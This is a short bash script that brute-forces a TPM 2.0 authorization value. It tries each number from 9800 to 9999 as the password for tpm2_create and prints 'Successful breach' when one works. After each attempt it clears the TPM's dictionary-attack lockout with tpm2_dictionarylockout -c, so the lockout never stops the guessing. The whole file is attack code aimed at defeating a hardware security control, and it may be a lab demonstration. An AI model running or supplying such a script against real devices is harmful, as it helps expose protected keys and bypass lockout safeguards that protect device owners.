#!/bin/bash

# Start seq range from leading 0000 to 9999 in for loop
for nCount in $(seq 9800 9999)
do 
  # Brute force by trying current number in loop as Auth value
  if tpm2_create -G rsa -u rsa.pub -r rsa.priv -C srk.ctx -P $nCount
  then 
    echo "Successful breach with ${nCount}"
    # Break out of loop
    break
  else
    echo "Unsuccessful using Auth value ${nCount}"
  fi 
  # Free TPM memory
  tpm2_flushcontext -t
  # Prevent being locked out automatically out of TPM
  tpm2_dictionarylockout -c 
done
